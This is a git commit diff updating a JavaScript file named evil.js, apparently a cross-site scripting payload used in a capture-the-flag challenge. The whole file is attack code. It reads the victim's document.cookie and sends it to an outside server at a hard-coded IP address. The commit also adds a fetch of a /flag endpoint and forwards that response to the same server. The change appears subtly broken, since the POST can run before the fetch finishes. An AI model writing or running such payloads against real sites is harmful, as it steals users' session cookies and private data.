4ed25b22a0e697dc428cd4477ccdc9c1644aa137
LeCrepuscule <143530654+tac-eL@users.noreply.github.com>
2024-10-29 09:37:07 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,7 +1,21 @@
 const cookie = document.cookie;
-const textContent = document.body.innerText;
 const targetServer = "http://139.224.199.99:9999/";
 const target = targetServer + "cookie?" + cookie;
+let responseData;
+
+fetch('http://0192d5de50dd7dfeb24785eecc33bd0b.uy3t.dg02.ciihw.cn:44940/flag', {
+    method: 'GET',
+})
+.then(response => {
+    // 确保响应是成功的
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+    return response.json();
+})
+.then(data => {
+    responseData = data; // 将响应数据存储在变量中
+})
 
 fetch(target, {
     method: 'POST',
@@ -9,7 +23,7 @@ fetch(target, {
         'Content-Type': 'application/json'
     },
     body: JSON.stringify({
-        result: textContent
+        result: responseData
     })
 })
 
